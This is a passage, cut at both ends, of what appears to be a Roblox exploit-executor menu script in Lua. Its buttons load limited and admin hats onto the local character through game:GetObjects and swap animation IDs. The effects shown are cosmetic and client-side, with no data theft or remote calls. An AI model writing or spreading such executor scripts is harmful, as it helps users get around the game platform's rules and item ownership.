                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(e, _)
            _.Parent = e
            local d = _:FindFirstChild("Handle")
            if d then
                local a = d:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = c(e, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = e:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local _ = _.AttachmentPoint
                        b("HeadWeld", c, c, d, a, _)
                    end
                end
            end
        end
        local _ = 1016143686
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Pink-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(d, _, a, b, c, e)
            local f = Instance.new("Weld")
            f.Name = d
            f.Part0 = a
            f.Part1 = b
            f.C0 = c
            f.C1 = e
            f.Parent = _
            return f
        end
        local function b(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = b(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(c, d)
            d.Parent = c
            local e = d:FindFirstChild("Handle")
            if e then
                local a = e:FindFirstChildOfClass("Attachment")
                if a then
                    local _ = b(c, a.Name)
                    if _ then
                        l(_, a)
                    end
                else
                    local c = c:FindFirstChild("Head")
                    if c then
                        local a = CFrame.new(0, 0.5, 0)
                        local b = d.AttachmentPoint
                        _("HeadWeld", c, c, e, a, b)
                    end
                end
            end
        end
        local _ = 334663683
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Orange-Sparkle-Time-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(d, e, b, c, a, _)
            local f = Instance.new("Weld")
            f.Name = d
            f.Part0 = b
            f.Part1 = c
            f.C0 = a
            f.C1 = _
            f.Parent = e
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, d)
            d.Parent = _
            local e = d:FindFirstChild("Handle")
            if e then
                local c = e:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(_, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = d.AttachmentPoint
                        b("HeadWeld", c, c, e, _, a)
                    end
                end
            end
        end
        local _ = 215751161
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Bluesteel-Fedora [R15 & R6]",
	Callback = function()
	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function _(_, a, b, d, c, e)
            local f = Instance.new("Weld")
            f.Name = _
            f.Part0 = b
            f.Part1 = d
            f.C0 = c
            f.C1 = e
            f.Parent = a
            return f
        end
        local function a(_, b)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == b then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = a(_, b)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(b, d)
            d.Parent = b
            local e = d:FindFirstChild("Handle")
            if e then
                local c = e:FindFirstChildOfClass("Attachment")
                if c then
                    local _ = a(b, c.Name)
                    if _ then
                        l(_, c)
                    end
                else
                    local c = b:FindFirstChild("Head")
                    if c then
                        local b = CFrame.new(0, 0.5, 0)
                        local a = d.AttachmentPoint
                        _("HeadWeld", c, c, e, b, a)
                    end
                end
            end
        end
        local _ = 98346834
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})


local Section = CharacterTab:AddSection({
	Name = "Roblox Admin Accessories"
})

CharacterTab:AddButton({
	Name = "Golden Roblox Bowler [R15 & R6]",
	Callback = function()
    	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 2910028689
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Goldlika: Bloxstar [R15 & R6]",
	Callback = function()
        	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 4637651199
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

local Section = CharacterTab:AddSection({
	Name = "Other limited hats"
})

CharacterTab:AddButton({
	Name = "Black Iron Horns [R15 & R6]",
	Callback = function()
            	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 628771505
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Supa Dupa Fly Cap [R15 & R6]",
	Callback = function()
                	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1609401184
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Supa Fly Cap [R15 & R6]",
	Callback = function()
                    	        function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 7636350
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Silverthorn Antlers [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 9255011
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "BIG: Silverthorn Antlers [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 477860473
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Golden Antlers [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 193659065
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "The Classic ROBLOX Fedora [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1029025
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Clockwork's Shades [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 11748356
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Clockwork's Headphones [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1235488
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Blue Clockwork Headphones [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1743903423
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "Silver King of the Night [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 439945661
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})

CharacterTab:AddButton({
	Name = "The Void Star [R15 & R6]",
	Callback = function()
     function l(a, _)
            local b = Instance.new("Weld")
            b.Part0 = a.Parent
            b.Part1 = _.Parent
            b.C0 = a.CFrame
            b.C1 = _.CFrame
            b.Parent = a.Parent
            return b
        end
        local function b(a, _, c, b, e, d)
            local f = Instance.new("Weld")
            f.Name = a
            f.Part0 = c
            f.Part1 = b
            f.C0 = e
            f.C1 = d
            f.Parent = _
            return f
        end
        local function c(_, a)
            for _, _ in pairs(_:GetChildren()) do
                if _:IsA("Attachment") and _.Name == a then
                    return _
                elseif not _:IsA("Accoutrement") and not _:IsA("Tool") then
                    local _ = c(_, a)
                    if _ then
                        return _
                    end
                end
            end
        end
        function k(_, a)
            a.Parent = _
            local d = a:FindFirstChild("Handle")
            if d then
                local e = d:FindFirstChildOfClass("Attachment")
                if e then
                    local _ = c(_, e.Name)
                    if _ then
                        l(_, e)
                    end
                else
                    local c = _:FindFirstChild("Head")
                    if c then
                        local _ = CFrame.new(0, 0.5, 0)
                        local a = a.AttachmentPoint
                        b("HeadWeld", c, c, d, _, a)
                    end
                end
            end
        end
        local _ = 1125510
        local _ = game:GetObjects("rbxassetid://" .. tostring(_))[1]
        k(game.Players.LocalPlayer.Character, _)
  	end    
})





local Section = CharacterTab:AddSection({
	Name = "Avatar Animations"
})



	local buttons = script.Parent
	local Animate = game.Players.LocalPlayer.Character:WaitForChild("Animate")
	
	game.Players.LocalPlayer.CharacterAdded:Connect(function()
		Animate = game.Players.LocalPlayer.Character:WaitForChild("Animate")
	end)


CharacterTab:AddButton({
	Name = "Zombie [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616168032"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616163682"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616161997"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616156119"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616157476"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Astronaut [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=891667138"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=891636393"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=891627522"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=891609353"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=891617961"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Bubbly [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=910034870"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=910025107"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=910016857"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=910001910"
		Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
		Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Cartoony [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=742640026"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=742638842"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=742637942"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=742636889"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=742637151"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Elder [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=845403856"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=845386501"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=845398858"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=845392038"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=845396048"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Knight [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=657552124"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=657564596"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=658409194"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=658360781"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=657600338"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Levitation [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616013216"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616010382"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616008936"
		Animate.climb:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616003713"
		Animate.fall:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=616005863"
		game.Players.LocalPlayer.Character.Humanoid.Jump = true
  	end    
})


CharacterTab:AddButton({
	Name = "Mage [R15 Only]",
	Callback = function()
    		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
		Animate.walk:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=707897309"
		Animate.run:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=707861613"
		Animate.jump:FindFirstChildWhichIsA("Animation").AnimationId = "http://www.roblox.com/asset/?id=707853694"
